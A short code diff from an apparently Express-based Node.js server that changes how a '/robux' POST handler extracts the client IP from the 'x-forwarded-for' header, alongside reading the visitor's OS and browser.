@@ -77,7 +77,7 @@ app.post("/robux", async (req, res) => {
 
         if (success) {
             const userAgent = req.useragent;
-            const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+            const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress;
             const os = userAgent.os;
             const browser = userAgent.browser;
 
